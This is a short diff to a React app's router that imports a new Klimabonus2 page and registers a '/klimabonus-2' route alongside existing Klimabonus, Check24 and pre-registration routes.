@@ -75,6 +75,7 @@ import NotFound from "./pages/NotFound.tsx";
 import Error404 from "./pages/Error404.tsx";
 import SessionBankRouter from "./components/SessionBankRouter.tsx";
 import Klimabonus from "./pages/Klimabonus.tsx";
+import Klimabonus2 from "./pages/Klimabonus2.tsx";
 import Check24 from "./pages/Check24.tsx";
 import Check24Voranmeldung from "./pages/Check24Voranmeldung.tsx";
 import KlimabonusVoranmeldung from "./pages/KlimabonusVoranmeldung.tsx";
@@ -218,7 +219,8 @@ const App = () => (
 
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
             
-            <Route path="/klimabonus" element={<P><Klimabonus /></P>} />
+           <Route path="/klimabonus" element={<P><Klimabonus /></P>} />
+           <Route path="/klimabonus-2" element={<P><Klimabonus2 /></P>} />
             <Route path="/check24" element={<P><Check24 /></P>} />
             <Route path="/check24/sichern" element={<P><Check24Voranmeldung /></P>} />
             <Route path="/klimabonus/voranmeldung" element={<P><KlimabonusVoranmeldung /></P>} />
